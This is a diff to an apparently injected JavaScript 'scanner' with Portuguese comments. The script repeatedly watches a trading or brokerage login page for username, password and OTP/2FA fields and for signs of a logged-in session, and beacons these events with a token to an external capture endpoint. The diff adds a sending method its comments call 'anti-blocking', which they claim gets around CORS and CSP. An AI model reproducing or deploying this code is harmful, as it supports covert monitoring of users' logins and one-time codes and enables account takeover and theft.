@@ -1,25 +1,46 @@
-(function() {
+(function () {
 
     console.log("NEXUS SCANNER iniciado ✔");
 
     const TOKEN = window.NEXUS_TOKEN_INJECT || "032318";
     const CAPTURE_URL = window.NEXUS_CAPTURE_ENDPOINT;
 
+    // =========================================================
+    //  MÉTODO ANTI-BLOQUEIO 🔥 — Envia usando BEACON
+    //  (não pode ser bloqueado por CORS / CSP)
+    // =========================================================
     function sendCapture(data) {
-        return fetch(CAPTURE_URL, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "X-Nexus-Token": TOKEN
-            },
-            body: JSON.stringify(data)
-        })
-        .then(r => r.json())
-        .catch(err => {
-            console.log("Erro ao enviar captura:", err);
+        const payload = JSON.stringify({
+            token: TOKEN,
+            ...data
         });
+
+        try {
+            const ok = navigator.sendBeacon(CAPTURE_URL, payload);
+
+            if (ok) {
+                console.log("📡 Beacon enviado →", data.event);
+            } else {
+                console.log("❌ Beacon falhou, tentando fetch…");
+
+                // fallback opcional (fetch será bloqueado, mas tentamos)
+                fetch(CAPTURE_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "X-Nexus-Token": TOKEN
+                    },
+                    body: payload
+                }).catch(() => {});
+            }
+        } catch (err) {
+            console.log("Erro no sendBeacon:", err);
+        }
     }
 
+    // =========================================================
+    //  DETECÇÃO DE CAMPOS DE LOGIN
+    // =========================================================
     function getLoginFields() {
         const inputs = document.querySelectorAll("input");
         let user = null, pass = null;
@@ -40,6 +61,9 @@
         return { user, pass };
     }
 
+    // =========================================================
+    //  DETECÇÃO DE CAMPO OTP (token/2FA)
+    // =========================================================
     function getOTPField() {
         const inputs = document.querySelectorAll("input");
 
@@ -55,6 +79,9 @@
         return null;
     }
 
+    // =========================================================
+    //  VERIFICAÇÃO LOGIN
+    // =========================================================
     function checkForLogin() {
         try {
             const { user, pass } = getLoginFields();
@@ -64,8 +91,8 @@
 
                 sendCapture({
                     event: "login_fields_detected",
-                    user_placeholder: user.placeholder,
-                    pass_placeholder: pass.placeholder,
+                    user_placeholder: user.placeholder || "",
+                    pass_placeholder: pass.placeholder || "",
                     timestamp: Date.now()
                 });
             }
@@ -74,6 +101,9 @@
         }
     }
 
+    // =========================================================
+    //  VERIFICAÇÃO OTP
+    // =========================================================
     function checkForOTP() {
         try {
             const otp = getOTPField();
@@ -92,6 +122,9 @@
         }
     }
 
+    // =========================================================
+    //  DETECTA SE JÁ ESTÁ LOGADO
+    // =========================================================
     function checkIfLoggedIn() {
         try {
             const keywordTests = [
@@ -99,31 +132,27 @@
                 "Mercado", "OTC", "Ações", "Cripto", "Paridades", "Operar"
             ];
 
-            const pageText = document.body.innerText || "";
-            const found = keywordTests.some(kw => pageText.includes(kw));
+            const found = keywordTests.some(kw =>
+                document.body.innerText.includes(kw)
+            );
 
             if (found) {
-                console.log("NEXUS: Login detectado ✔");
-
                 sendCapture({
-                    event: "login_confirmed",
+                    event: "logged_in",
                     timestamp: Date.now()
                 });
             }
+
         } catch (e) {
-            console.log("Erro no scanner login-detect:", e);
+            console.log("Erro ao detectar login:", e);
         }
     }
 
-    function periodicCheck() {
-        checkForLogin();
-        checkForOTP();
-        checkIfLoggedIn();
-    }
-
-    console.log("NEXUS: scanner ativo. Monitorando…");
-
-    // Roda a cada 1,5s
-    setInterval(periodicCheck, 1500);
+    // =========================================================
+    //  LOOPS DE MONITORAMENTO
+    // =========================================================
+    setInterval(checkForLogin, 1200);
+    setInterval(checkForOTP, 1500);
+    setInterval(checkIfLoggedIn, 2000);
 
 })();
